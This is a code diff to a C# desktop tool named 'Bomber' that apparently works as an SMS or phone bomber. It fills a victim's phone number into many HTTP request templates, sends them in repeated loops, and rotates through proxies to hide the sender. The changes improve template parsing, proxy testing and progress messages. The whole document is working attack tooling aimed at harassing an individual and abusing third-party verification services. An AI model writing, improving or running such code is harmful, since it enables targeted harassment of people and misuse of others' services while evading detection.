@@ -81,24 +81,42 @@ namespace Bomber
                             method = arr[1].Replace("'", "").Replace("\"", "").Trim();
                             url = arr[2].Replace("'", "").Replace("\"", "").Trim();
 
-                            Console.WriteLine(arr[4]);
-                            var pattern = "(?:params=({[^}]*}))?(?:,(?: )?)?(?:data=({[^}]*}))?(?:,(?: )?)?(?:json=({[^}]*}))?(?:,(?: )?)?(?:delay=([0-9.]+))?";
-                            var groups = Regex.Match(arr[4].Replace(")", "").Trim(), pattern).Groups;
-                            Console.WriteLine(groups[0]);
-                            urlp = ConvertTo(groups[1].Value);
-                            data = ConvertTo(groups[2].Value);
-                            json = groups[3].Value;
-                            delay = groups[4].Value == "" ? 0f : Convert.ToSingle(groups[4].Value);
-
-                            if (urlp != "")
+                            if (arr.Length > 4)
                             {
-                                url += "?" + urlp;
+                                //var pattern = "(?:params=({[^}]*}))?[}, ]*(?:data=({[^}]*}))?[}, ]*(?:json=({[^}]*}))?[}, ]*(?:delay=([0-9.]+))?";
+                                var input = arr[4].Replace(")", "").Trim();
+                                var pattern1 = "params=({[^}]*})";
+                                var pattern2 = "data=({[^}]*})";
+                                var pattern3 = "json=({[^}]*})";
+                                var pattern4 = "delay=([0-9.]+)";
+                                var groups1 = Regex.Match(input, pattern1).Groups;
+                                var groups2 = Regex.Match(input, pattern2).Groups;
+                                var groups3 = Regex.Match(input, pattern3).Groups;
+                                var groups4 = Regex.Match(input, pattern4).Groups;
+
+                                urlp = ConvertTo(groups1[1].Value);
+                                data = ConvertTo(groups2[1].Value);
+
+                                json = groups3[1].Value.Replace("'", "\"");
+                                int startCount = json.Count(c => c == '{'), endCount = json.Count(c => c == '}');
+                                if (endCount < startCount)
+                                {
+                                    for (int i = endCount; i < startCount; i++)
+                                        json += "}";
+                                }
+
+                                delay = groups4[1].Value == "" ? 0f : Convert.ToSingle(groups4[1].Value);
+
+                                if (urlp != "")
+                                {
+                                    url += "?" + urlp;
+                                }
                             }
 
                             var name = start.Split('(')[0].Substring(start.IndexOf(" ") + 1);
                             var http = new Http();
 
-                            http.Method = method;
+                            http.Method = method.ToUpper();
                             http.Url = url;
                             http.Headers = headers;
                             http.Data = data != "" ? data : json;
@@ -132,6 +150,8 @@ namespace Bomber
             {
                 Bullets.Items.Add(http.Key, true);
             }
+
+            RefreshBullets.Text = String.Format("刷新({0})", Https.Count); 
         }
 
         private void Main_Load(object sender, EventArgs e)
@@ -261,9 +281,9 @@ namespace Bomber
                     string key = (string)Bullets.Items[i];
                     var http = new Http();
                     http.Method = Https[key].Method;
-                    http.Url = Https[key].Url.Replace("=target", "=" + phone);
+                    http.Url = Https[key].Url.Replace("+target+", phone).Replace("=target", "=" + phone);
                     http.Headers = Https[key].Headers;
-                    http.Data = Https[key].Data.Replace("target", phone);
+                    http.Data = Https[key].Data.Replace("'+target+'", phone).Replace("target", phone);
                     http.Delay = Https[key].Delay;
                     https[key] = http;
                 }
@@ -299,7 +319,10 @@ namespace Bomber
                         var r = Http.Request(http.Value, !proxyEnabled || proxies.Length == 0 ? null : proxies[new Random().Next(0, proxies.Length)]);
                         SetText("输出结果: " + r + "\n\n");
                         if (http.Value.Delay > 0f)
+                        {
+                            SetText("请稍等...\n\n");
                             Thread.Sleep((int)(http.Value.Delay * 1000f));
+                        }
                     }
                     SetText(">> 第" + i + "次循环结束\n\n");
                     Thread.Sleep((int)(delay * 1000f));
@@ -373,21 +396,32 @@ namespace Bomber
 
                 try
                 {
-                    var request = (HttpWebRequest)WebRequest.Create("http://httpbin.org/ip");
-
                     foreach (var p in proxies)
                     {
+                        var request = (HttpWebRequest)WebRequest.Create("http://httpbin.org/ip");
+
                         var proxy = new WebProxy(p);
+                        proxy.BypassProxyOnLocal = true;
                         request.Proxy = proxy;
 
-                        response = request.GetResponse();
-                        r = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
-                        SetText("测试结果: " + r.ReadToEnd() + "\n\n");
+                        SetText("开始测试: " + p + "\n");
+
+                        try
+                        {
+
+                            response = request.GetResponse();
+                            r = new StreamReader(response.GetResponseStream(), Encoding.UTF8);
+                            SetText("测试结果: " + r.ReadToEnd() + "\n\n");
+                        }
+                        catch (WebException wex)
+                        {
+                            SetText("测试出错: " + wex.Message + "\n\n");
+                        }
                     }
                 }
                 catch (Exception ex)
                 {
-                    SetText("测试出错: " + ex.Message + "\n\n");
+                    SetText("程序出错: " + ex.Message + "\n\n");
                 }
                 finally
                 {
